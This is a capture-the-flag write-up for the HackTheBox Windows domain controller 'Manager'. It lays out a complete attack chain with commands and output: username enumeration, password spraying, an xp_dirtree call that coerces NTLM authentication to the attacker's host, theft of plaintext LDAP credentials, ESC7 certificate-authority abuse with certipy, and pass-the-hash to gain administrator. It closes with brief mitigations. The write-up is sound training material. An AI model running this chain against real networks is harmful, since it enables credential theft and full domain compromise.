---
title: "HackTheBox - Manager"
author: Nasrallah
description: ""
date: 2024-03-17 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, medium, esc7, kerbrute, mssql, rid, bruteforce, adcs]
img_path: /assets/img/hackthebox/machines/manager
image:
    path: manager.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Manager](https://www.hackthebox.com/machines/manager) from [HackTheBox](https://affiliate.hackthebox.com/nasrallahbaadi) is a domain controller where we run kerbrute to get the usernames, one user is using a weak passwords allowing us to access `mssql` where we use `xp-dirtree` to find a backup file of a website, we download it and find some credentials in it giving us foothold. After that an ESC7 misconfiguration in an ADCS and get administrator access.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.236         
Host is up (0.25s latency).    
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus            
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:                        
|_  Potentially risky methods: TRACE                                                                                                                                                                                                        
|_http-title: Manager                                                                                                 
|_http-server-header: Microsoft-IIS/10.0        
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-13 23:57:59Z)     
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb                                                                      
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28                                                                               
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-02-13T23:59:22+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?                                                                                          
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-13T23:59:22+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-02-13T23:59:23+00:00; +7h00m01s from scanner time.
| ms-sql-ntlm-info:                                                                                                   
|   10.10.11.236:1433:                                                                                                
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER            
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-02-13T12:02:26
|_Not valid after:  2054-02-13T12:02:26
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-13T23:59:22+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-13T23:59:22+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-13T23:58:42
|_  start_date: N/A
```

The target seems to be a domain controller and there is a web server on port 80.

Before continuing we need to add `dc01.manager.htb` and `manager.htb` to our `/etc/hosts` file.

### Web

Let's check the web page.

![webpage](1.png)

There is nothing interesting in this page, I tried fuzzing for files and didn't find anything, the same with subdomains.

### Kerbrute

Let's enumerate usernames using `kerbrute userenum -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.236`

```terminal
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/13/24 - Ronnie Flathers @ropnop

2024/02/13 16:02:17 >  Using KDC(s):
2024/02/13 16:02:17 >   10.10.11.236:88

2024/02/13 16:02:22 >  [+] VALID USERNAME:       ryan@manager.htb
2024/02/13 16:02:31 >  [+] VALID USERNAME:       guest@manager.htb
2024/02/13 16:02:35 >  [+] VALID USERNAME:       cheng@manager.htb
2024/02/13 16:02:38 >  [+] VALID USERNAME:       raven@manager.htb
2024/02/13 16:02:59 >  [+] VALID USERNAME:       administrator@manager.htb
2024/02/13 16:03:35 >  [+] VALID USERNAME:       Ryan@manager.htb
2024/02/13 16:03:39 >  [+] VALID USERNAME:       Raven@manager.htb
2024/02/13 16:04:01 >  [+] VALID USERNAME:       operator@manager.htb
2024/02/13 16:07:12 >  [+] VALID USERNAME:       Guest@manager.htb
2024/02/13 16:07:14 >  [+] VALID USERNAME:       Administrator@manager.htb
2024/02/13 16:09:27 >  [+] VALID USERNAME:       Cheng@manager.htb
2024/02/13 16:15:15 >  [+] VALID USERNAME:       jinwoo@manager.htb
```

We ended up with this list, let's clean it to get the usernames only with the following command:

```bash
cat users.txt | tr -s ' ' | cut -d ' ' -f 7 | cut -d '@' -f 1
```

Now we have a clean list

```terminal
ryan
guest
cheng
raven
administrator
Ryan
Raven
operator
Guest
Administrator
Cheng
jinwoo
```

### RID

Alternatively, we could have got the usernames through the `rid` using either of the following commands:

```bash
crackmapexec smb 10.10.11.236 -u 'guest' -p '' --rid-brute
lookupsid.py guest@10.10.11.236 --no-pass
```

This method will give us the same usernames which proves to be better than the first method (brute force) where the username must be in the wordlist.

### SMB

Let's see if someone is using the username as a password with the following command:

```bash
$ crackmapexec smb manager.htb -u users.lst -p users.lst --no-bruteforce

SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         manager.htb     445    DC01             [-] manager.htb\Raven:Raven STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [+] manager.htb\operator:operator
```

The user `operator` is using the username as a password great!

I tried connecting with `evil-winrm` but didn't work and SMB has nothing good for us.

### MSSQL

Let's connect `MSSQL` with the following command: `impacket-mssqlclient manager.htb/operator:operator@10.10.11.236 -windows-auth`

```shell
$ impacket-mssqlclient manager.htb/operator:operator@10.10.11.236 -windows-auth

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 
```

There is nothing useful in the database and we can't run commands.

One thing I like to do after getting access to mssql is to get the `NTLMv2` hash.

First we setup `responder` then run this command `xp_dirtree \\10.10.16.38\asdf;`

![ntlmv2](2.png)

We got the hash but unfortunately I couldn't crack it.

## **Foothold**

One other trick we can do with `xp_dirtree` is to list folders using the following command.

```shell
EXEC xp_dirtree '{folder}', 1, 1;
```

We coulnd't find anything on the website earlier so let's check if there is anything good in the root directory.

Since the web server is Microsoft IIS, the web root is located at `C:\inetpub\wwwroot`.

```bash
SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1   

SQL (MANAGER\Operator  guest@master)> 

```

We found a backup file, let's download it and see what we can find.

```shell
wget http://manager.htb/website-backup-27-07-23-old.zip

unzip website-backup-27-07-23-old.zip

cat .old-conf.xml 
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>                               
```

We found an XML configuration file that has the password of `raven`.

Let's try connecting via `winrm`.

```shell
$ evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> 
```

Great! We got access.

## **Privilege Escalation**

I did some local enumeration and used bloodhound but couldn't find anything.

### Certify

One thing we can check is the Certificate templates, we can do that using [certify.exe](https://github.com/GhostPack/Certify)

```terminal
*Evil-WinRM* PS C:\Users\Raven\Documents> .\certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0
'
[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'

[*] Listing info about the Enterprise CA 'manager-DC01-CA'

    Enterprise CA Name            : manager-DC01-CA
    DNS Hostname                  : dc01.manager.htb
    FullName                      : dc01.manager.htb\manager-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
    Cert Start Date               : 7/27/2023 3:21:05 AM
    Cert End Date                 : 7/27/2122 3:31:04 AM
    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Deny   ManageCA, Read                             MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Allow  ManageCA, Enroll                           MANAGER\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116
      Allow  Enroll                                     MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
    Enrollment Agent Restrictions : None


```

Here we can see that user `Raven` has `ManageCA` rights on `manager-DC01-CA` certificate, this vulnerability is known as [ESC7](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7).

To exploit this we need to run the following commands.

```shell
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -template SubCA -upn administrator@manager.htb
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 13 -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123'
certipy-ad req -ca 'manager-DC01-CA' -target manager.htb -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -retrieve 13
```

> You might need to change the number 13 to the request ID you get after running the third command.

![cer](3.png)

We got the administrator certificate, now let's use it to get the administrator's hash.

```shell
$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236     

Certipy v4.7.0 - by Oliver Lyak (ly4k)
                                                           
[*] Using principal: administrator@manager.htb                                                                        
[*] Trying to get TGT...    
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

It didn't work because our local time needs to be synchronized with the DC. To do that we can run `rdate -n manager.htb`.

```shell
$ sudo rdate -n manager.htb | certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236  
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

We got administrator's hash, now we can use `pass-the-hash` attack to get a shell.

```bash
$ evil-winrm -i manager.htb -u 'administrator' -H ae5064c2f62317332c88629e025924ef
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
manager\administrator
```

## **Prevention and Mitigation**

### Passwords

The user operator used his username as a password which is a bad, very bad practice here. Passwords should be long, complex and changed frequently.

We also found `raven`'s password stored in plaintext

### ESC7

The user `raven` had the `ManageCA` right that allowed us to get administrator access.

The right should be revoked from the user `raven` and apply the principle of least privilege to all users in the domain.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

## References

<https://github.com/GhostPack/Certify>

<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7>
